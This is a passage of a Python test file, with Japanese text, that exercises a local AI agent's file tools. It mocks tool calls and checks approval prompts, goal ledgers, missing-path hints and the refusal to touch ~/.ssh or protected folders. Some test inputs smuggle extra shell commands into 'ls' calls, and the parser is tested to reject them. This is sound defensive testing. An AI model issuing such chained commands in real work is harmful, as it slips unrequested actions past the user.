    def run19(name, args, *positional, **kwargs):
        if name == "sh":
            if args["command"].startswith("cp "):
                shutil.copyfile(source19, new19)
            return {"ok": True, "結果": "確認済み"}
        return real_run(name, args, *positional, **kwargs)
    with mock.patch.object(jiyuu, "_ask", side_effect=replies19) as ask, \
         mock.patch.object(jiyuu, "_run", side_effect=run19) as run:
        assert jiyuu.kotaeru("~/Documents/今回/報告.txt の写しを上書きせず報告_新.txtにし、索引.csvを作って") == "完了"
    assert [entry.args[0] for entry in run.call_args_list] == ["sh", "copy", "sh", "write"]
    assert not any(entry.kwargs.get("final") for entry in ask.call_args_list)
    assert source19.read_text() == new19.read_text() == "今回の報告: ORBIT-643\n"
    assert previous19.read_text() == "前回の報告: ORBIT-319\n" and index19.read_text() == csv19
    checks += 1

    # 変更なし・失敗した変更の後は同じ読取を止める。変更操作の重複も従来どおり止める。
    for middle in ([], [call("sh", command="cp ~/ない.txt ~/写し.txt")]):
        with mock.patch.object(jiyuu, "_ask", side_effect=[{"tool_calls": [ls19] + middle + [ls19]}, {"content": "完了"}]), \
             mock.patch.object(jiyuu, "_run", side_effect=lambda name, args, *a, **kw: {"ok": name != "copy"}) as run:
            assert jiyuu.kotaeru("確認して") == "完了"
        assert len(run.call_args_list) == 1 + len(middle)
    same_write = call("write", path=str(index19), content=csv19)
    with mock.patch.object(jiyuu, "_ask", side_effect=[{"tool_calls": [same_write, same_write]}, {"content": "完了"}]), \
         mock.patch.object(jiyuu, "_run", wraps=real_run) as run:
        assert jiyuu.kotaeru("索引を作って") == "完了"
    assert run.call_count == 1
    checks += 1

    # J02/J04の元の頼みは通る。J10の手動承認は省略されず、否認なら実行しない。
    regression_home = Path(temporary) / "regression-home"
    old02 = regression_home / "Downloads/old.tmp"
    old02.parent.mkdir(parents=True, exist_ok=True)
    old02.write_text("ゴミ箱行き")
    meeting04 = regression_home / "Documents/meeting.txt"
    meeting04.parent.mkdir(parents=True)
    meeting04.write_text("移動対象")
    for request, action, source, destination in (
            ("~/Downloads の old.tmp をゴミ箱へ移し、元の場所から消えたか確かめて",
             call("trash", paths=[str(old02)]), old02, regression_home / ".Trash/old.tmp"),
            ("~/Documents の meeting.txt を ~/Desktop/整理 へ移し、確認して",
             call("move", src=str(meeting04), dst="~/Desktop/整理/meeting.txt"),
             meeting04, regression_home / "Desktop/整理/meeting.txt")):
        with mock.patch.dict(os.environ, {"HOME": str(regression_home)}), \
             mock.patch.object(jiyuu, "_ask", side_effect=[{"tool_calls": [action]}, {"content": "完了"}]):
            assert jiyuu.kotaeru(request) == "完了"
        assert not source.exists() and destination.exists()
        checks += 1
    with mock.patch.object(jiyuu, "_ask", side_effect=[{"tool_calls": [
            call("sh", command="osascript -e 'set volume output volume 35'")]}, {"content": "未実行"}]), \
         mock.patch.object(jiyuu, "_kiku", return_value=False) as approval, \
         mock.patch.object(jiyuu, "_run") as run:
        assert jiyuu.kotaeru("Macの音量を35に変えてから読み直して。試験用なので承認を求めて", mode="手動") == "未実行"
    approval.assert_called_once()
    run.assert_not_called()
    checks += 1

    # 9/30 Claude: 途中で予定だけ書いて止まったら1回だけ続けさせる（J14）。read の「場所がありません」にも見つけた場所を返す（J16）。
    assert jiyuu._unfinished_plan("前の結果に基づき、3つ残っていると判断します。次に、コピー先のファイルを確認し、各ファイルの本文の件数を数えます。")
    assert not jiyuu._unfinished_plan("3つのファイルをコピーし、一覧.csv を作りました。")
    assert not jiyuu._unfinished_plan("完了しました。次に何かあれば言ってください。")
    assert jiyuu._unfinished_plan("月曜.txtの内容を確認します。")   # 10/1 J14
    assert not jiyuu._unfinished_plan("フォルダは3つあります。")
    assert not jiyuu._unfinished_plan("コピーし、一覧.csv に3行を書きました。原本は残しています。")
    # 達成条件の台帳: 新しい言い回しを中心に、曖昧な依頼は条件化しない。
    ledger_cases = [
        "~/Documents/原稿.txt のバックアップを ~/Desktop/保管 に作成。原本はそのままにする。",
        "~/Documents/設定.ini を /Users/test/Desktop/退避/別名.ini に複製してから、[開発] 節はそのままにしておく。",
        "~/Desktop/集計.csv の列を 品名,必要数 にして保存。",
    ]
    ledgers = [jiyuu._ledger_extract(item) for item in ledger_cases]
    assert ledgers[0] == [
        {"type": "copy", "src": "~/Documents/原稿.txt", "dst": "~/Desktop/保管/原稿.txt"},
        {"type": "unchanged", "path": "~/Documents/原稿.txt"}]
    assert ledgers[1][0] == {"type": "copy", "src": "~/Documents/設定.ini",
                              "dst": "/Users/test/Desktop/退避/別名.ini"}
    assert {"type": "unchanged_parts", "path": "~/Documents/設定.ini",
            "section": "開発", "comments": False} in ledgers[1]
    assert ledgers[2] == [{"type": "csv_header", "path": "~/Desktop/集計.csv",
                           "header": ["品名", "必要数"]}]
    assert jiyuu._ledger_extract("~/Documents/a.txt と ~/Desktop/b.txt を整理して") == []
    assert jiyuu._ledger_extract("~/Desktop/集計.csv を作る。列は特に指定しない") == []
    assert jiyuu._ledger_extract("~/Documents/a.txt を ~/Desktop/b.txt にコピーし、~/Desktop/c.txt にもコピー") == []
    copy_file = home / "Documents" / "確認元.txt"
    copy_dest = home / "Desktop" / "確認先.txt"
    copy_file.parent.mkdir(parents=True, exist_ok=True)
    copy_dest.parent.mkdir(parents=True, exist_ok=True)
    copy_file.write_text("変更前\n")
    copy_dest.write_text("変更前\n")
    config = home / "Documents" / "環境.txt"
    config.write_text("[本番]\n通知=無効\n# 維持\n[試験]\n通知=無効\n")
    csv_file = home / "Desktop" / "条件.csv"
    csv_file.write_text("列1,列2\n値,値\n")
    conditions = [{"type": "copy", "src": "~/Documents/確認元.txt", "dst": "~/Desktop/確認先.txt"},
                  {"type": "csv_header", "path": "~/Desktop/条件.csv", "header": ["列1", "列2"]},
                  {"type": "unchanged_parts", "path": "~/Documents/環境.txt", "section": "本番", "comments": True}]
    snapshots = jiyuu._ledger_start(conditions)
    assert jiyuu._ledger_check(conditions, snapshots) == []  # 満たせば促しなし
    before = (copy_file.read_bytes(), copy_dest.read_bytes(), csv_file.read_bytes(), config.read_bytes())
    copy_dest.write_text("違う\n")
    unmet = jiyuu._ledger_check(conditions, snapshots)
    assert unmet and "確認先.txt" in unmet[0]
    first, nudged = jiyuu._ledger_finish("作業しました。", unmet, False)
    second, nudged_again = jiyuu._ledger_finish(first, unmet, nudged)
    assert first.startswith("まだ満たしていない:") and nudged
    assert "未達の条件:" in second and "確認先.txt" in second and not nudged_again
    assert (copy_file.read_bytes(), csv_file.read_bytes(), config.read_bytes()) == (before[0], before[2], before[3])
    # 301ファイルまたは20MiB超の対象は snapshot を取らず、条件を確認対象から外す。
    oversized = home / "Documents" / "多いフォルダ"
    oversized.mkdir()
    for index in range(301):
        (oversized / f"{index}.txt").write_text("x")
    assert jiyuu._ledger_snapshot(str(oversized)) is None
    large_file = home / "Documents" / "大きい.txt"
    large_file.write_bytes(b"x" * (20 * 1024 * 1024 + 1))
    assert jiyuu._ledger_snapshot(str(large_file)) is None
    assert jiyuu._ledger_check([{"type": "copy", "src": str(oversized),
                                 "dst": str(home / "Desktop" / "控え")}],
                                {str(oversized): None}) == []
    checks += 1
    tickets = home / "Documents" / "作業票"
    tickets.mkdir(parents=True)
    ticket = tickets / "あ.txt"
    ticket.write_text("状態: 完了\n内容: 梱包\n")
    hint = jiyuu._missing_hint("read", {"path": "~/Documents/あ.txt"}, {"ok": False, "結果": "場所がありません: /x/あ.txt"},
                               [str(home / "Documents" / "作業票" / "あ.txt")])
    assert "作業票/あ.txt" in hint["次"]
    # 10/2: 知識を添えた頼みで作り話の場所を読んだら、ホームを探させず知識へ戻す（見つかった候補があればそちらが先）。
    made_up = {"ok": False, "結果": "場所がありません: /tmp/learned_articles.json"}
    assert "shiru" in jiyuu._missing_hint("read", {"path": "/tmp/learned_articles.json"}, dict(made_up), [], "", knowledge=True)["次"]
    assert "shiru" not in jiyuu._missing_hint("read", {"path": "/tmp/learned_articles.json"}, dict(made_up), [], "")["次"]
    assert "shiru" in jiyuu._missing_hint("sh", {"command": "cat /tmp/x.json"},
                                          {"ok": False, "結果": "cat: /tmp/x.json: No such file or directory"}, [], "", knowledge=True)["次"]
    assert "作業票/あ.txt" in jiyuu._missing_hint("read", {"path": "~/Documents/あ.txt"}, {"ok": False, "結果": "場所がありません: /x/あ.txt"},
                                               [str(ticket)], "", knowledge=True)["次"]
    sent = []
    replies = iter([{"content": "", "tool_calls": [call("mac", what="時刻")]},
                    {"content": "時刻を確かめました。次に、結果を記録します。"}, {"content": "正午でした。"}])
    def remember_last(messages, *a, **k):
        sent.append(messages[-1]["content"])
        return next(replies)
    with mock.patch.object(jiyuu, "_ask", side_effect=remember_last):
        with mock.patch.object(jiyuu, "_run", return_value={"ok": True, "結果": "正午"}):
            assert jiyuu.kotaeru("試験") == "正午でした。"
    assert "予定は書かずに" in sent[-1]
    checks += 1
    # J16: 素直な ls の出力だけを候補にする。長い表示・空白名・旗付きも確認。
    spaced = tickets / "空 白.txt"
    spaced.write_text("空白名")
    for command, output in (("ls ~/Documents/作業票", "あ.txt\n空 白.txt\n"),
                            ("/bin/ls -1aF -- ~/Documents/作業票", ".\n..\nあ.txt\n空 白.txt\n"),
                            ("ls -la ~/Documents/作業票", "total 8\n-rw-r--r-- 1 user staff 10 Oct 1 12:00 あ.txt\n")):
        paths = jiyuu._shell_ls_paths({"command": command}, {"ok": True, "結果": output})
        assert str(ticket) in paths
        assert all(Path(p).parent == tickets for p in paths)
    for command in ("ls", "ls -R ~/Documents/作業票", "ls -d ~/Documents/作業票",
                    "ls ~/Documents/作業票 ~/Desktop", "ls ~/Documents/*", "ls 'broken",
                    "ls ~/Documents/作業票 | cat", "ls ~/Documents/作業票; echo x",
                    "ls $(echo ~/Documents/作業票)", "ls ~/Documents/作業票 > /tmp/x"):
        assert not jiyuu._shell_ls_paths({"command": command}, {"ok": True, "結果": "あ.txt"})
    assert not jiyuu._shell_ls_paths({"command": "ls ~/Documents/作業票"}, {"ok": False, "結果": "あ.txt"})
    checks += 1

    missing = {"ok": False, "結果": "場所がありません"}
    wrong = {"path": "~/Documents/あ.txt", "start": "1", "end": "1"}
    request = "~/Documents/作業票 のtxtを読んで"
    fixed = jiyuu._retry_read(wrong, dict(missing), [], request, "test")
    assert fixed["ok"] and "状態: 完了" in fixed["結果"]
    assert f"場所を直しました: ~/Documents/あ.txt → {ticket}" in fixed["結果"]
    assert wrong["path"] == "~/Documents/あ.txt"
    # found と依頼から同じ実体が重なっても1件。start/end は保持する。
    with mock.patch.object(jiyuu, "_run", return_value={"ok": True, "結果": "本文"}) as run:
        fixed = jiyuu._retry_read(wrong, dict(missing), [str(ticket), str(ticket)], request, "test")
        assert fixed["ok"] and run.call_count == 1
        assert run.call_args.args[1] == {**wrong, "path": str(ticket)}
    checks += 1

    # 輪を通して ls の記憶から自動再読。依頼文に場所が無い場合も found が効く。
    replies = iter([{"content": "", "tool_calls": [call("sh", command="ls ~/Documents/作業票")]},
                    {"content": "", "tool_calls": [call("read", path="~/Documents/あ.txt")]},
                    {"content": "完了です。"}])
    tool_results = []
    def capture_retry(messages, *a, **k):
        if messages[-1]["role"] == "tool":
            tool_results.append(json.loads(messages[-1]["content"]))
        return next(replies)
    with mock.patch.object(jiyuu, "_ask", side_effect=capture_retry), \
         mock.patch.object(jiyuu, "_job", return_value={"ok": True, "結果": "あ.txt\n"}):
        assert jiyuu.kotaeru("作業票を読んで", mode="読むだけ") == "完了です。"
    assert tool_results[-1]["ok"] and "場所を直しました" in tool_results[-1]["結果"]
    checks += 1

    other = home / "Documents" / "別票"
    other.mkdir()
    (other / "あ.txt").write_text("別の本文")
    nested_ticket = tickets / "奥" / "奥.txt"
    nested_ticket.parent.mkdir()
    nested_ticket.write_text("奥の本文")
    with mock.patch.object(jiyuu, "_run") as run:
        for paths, text in (([], "~/Documents/作業票 と ~/Documents/別票 を読んで"),
                            ([str(ticket), str(other / "あ.txt")], ""), ([], "場所不明")):
            assert jiyuu._retry_read(wrong, dict(missing), paths, text, "test") == missing
        assert jiyuu._retry_read({"path": "~/奥.txt"}, dict(missing), [], request, "test") == missing
        assert jiyuu._retry_read(wrong, {"ok": False, "結果": "読取を拒否"}, [str(ticket)], request, "test")["結果"] == "読取を拒否"
        run.assert_not_called()
    quoted = home / "Documents" / "空 白票"
    quoted.mkdir()
    (quoted / "あ.txt").write_text("空白")
    assert jiyuu._missing_candidates(wrong["path"], [], f'"{quoted}" を読んで') == [str(quoted / "あ.txt")]
    checks += 1

    # 秘密・守りの場所、その場所へのリンクは候補にも助言にも使わない。
    secret = home / ".ssh"
    secret.mkdir(exist_ok=True)
    (secret / "あ.txt").write_text("試験用")
    protected = home / "守り"
    protected.mkdir()
    (protected / "あ.txt").write_text("試験用")
    (tickets / "秘密.txt").symlink_to(secret / "あ.txt")
    (tickets / "守り.txt").symlink_to(protected / "あ.txt")
    with mock.patch.object(jiyuu.gate, "_protected_roots", return_value=[str(protected.resolve())]), \
         mock.patch.object(jiyuu, "_run") as run:
        assert not jiyuu._missing_candidates(wrong["path"], [str(secret / "あ.txt"), str(protected / "あ.txt")], f"{secret} と {protected}")
        assert not jiyuu._shell_ls_paths({"command": "ls ~/Documents/作業票"}, {"ok": True, "結果": "秘密.txt\n守り.txt"})
        assert jiyuu._retry_read(wrong, dict(missing), [], f"{secret} と {protected}", "test") == missing
        run.assert_not_called()
    with mock.patch.object(jiyuu, "_risk", return_value="禁止"), mock.patch.object(jiyuu, "_run") as run:
        assert jiyuu._retry_read(wrong, dict(missing), [str(ticket)], request, "test") == missing
        run.assert_not_called()
    with mock.patch.object(jiyuu, "_request_guard", return_value="止める"), mock.patch.object(jiyuu, "_run") as run:
        assert jiyuu._retry_read(wrong, dict(missing), [str(ticket)], request, "test") == missing
        run.assert_not_called()
    checks += 1

    # 変更系は依頼フォルダから名指しするだけ。候補が複数なら両方を提示する。
    for name, args in (("move", {"src": wrong["path"], "dst": "~/Desktop/あ.txt"}),
                       ("trash", {"paths": [wrong["path"]]}),
                       ("edit", {**wrong, "old": "状態", "new": "状況"})):   # write は親のフォルダを作るので外す
        original_args = dict(args)
        hint = jiyuu._missing_hint(name, args, dict(missing), [], request)
        assert not hint["ok"] and str(ticket) in hint["次"] and args == original_args
    hint = jiyuu._missing_hint("edit", wrong, dict(missing), [], "~/Documents/作業票 と ~/Documents/別票")
    assert str(ticket) in hint["次"] and str(other / "あ.txt") in hint["次"]
    assert ticket.read_text().startswith("状態: 完了")
    checks += 1

    # 本番の数え間違い: フォルダ3つ + .DS_Store はフォルダ3、ファイル0。
    desktop = home / "数え用Desktop"
    desktop.mkdir()
    for name in ("甲", "乙", "丙"):
        (desktop / name).mkdir()
    (desktop / ".DS_Store").write_text("試験用")
    listed = jiyuu.gate._read_file(str(desktop))
    assert listed["結果"].startswith("フォルダ 3件・ファイル 0件（. で始まる隠し 1件は数えていない）\n")
    assert listed["件数"] == 3 and listed["種類別"] == {"フォルダ": 3} and listed["隠し"] == 1
    assert listed["名前"] == ["丙/", "乙/", "甲/"]
    empty = desktop / "甲"
    assert jiyuu.gate._read_file(str(empty))["結果"].startswith("フォルダ 0件・ファイル 0件（. で始まる隠し 0件は数えていない）")
    (desktop / "見える.txt").write_text("本文")
    assert jiyuu.gate._read_file(str(desktop))["結果"].startswith("フォルダ 3件・ファイル 1件（. で始まる隠し 1件は数えていない）")
    checks += 1
    # 9/30 Claude: あいまい判定は文を書く時に止めない。紛らわしい候補と別の名前のファイルは書ける（J19 の 索引.csv）。
assert jiyuu._request_guard("write", {"path": "/tmp/koukai-x/メモ.txt", "content": "x"}, "適当に名前をつけて保存して", [], "戻せる") == ""
_two = ["/tmp/koukai-x/Documents/今回/報告.txt", "/tmp/koukai-x/Desktop/提出控え/報告.txt"]
assert jiyuu._request_guard("write", {"path": "/tmp/koukai-x/Desktop/提出控え/索引.csv", "content": "x"},
                            "~/Documents/今回/報告.txt の写しと 索引.csv を作って", _two, "戻せる") == ""
assert "候補が複数" in jiyuu._request_guard("write", {"path": "/tmp/koukai-x/Desktop/報告.txt", "content": "x"}, "報告.txt を書き直して", _two, "戻せる")
checks += 1
# 10/1 Claude: コピーと同じ文の「元はそのまま」は元を指す。先（コピーで変わる場所）を「変えない」にしない。
_c = jiyuu._ledger_extract("~/Documents/a.txt を ~/Desktop/控え にコピーして、元はそのままにしといて")
assert {"type": "unchanged", "path": "~/Documents/a.txt"} in _c and not any(c["type"] == "unchanged" and "控え" in c["path"] for c in _c), _c
assert not any(c["type"] == "unchanged" for c in jiyuu._ledger_extract("~/A と ~/B を見比べて、そのまま答えて"))
checks += 1
print(f"jiyuu 自己試験: {checks}/{checks} PASS")
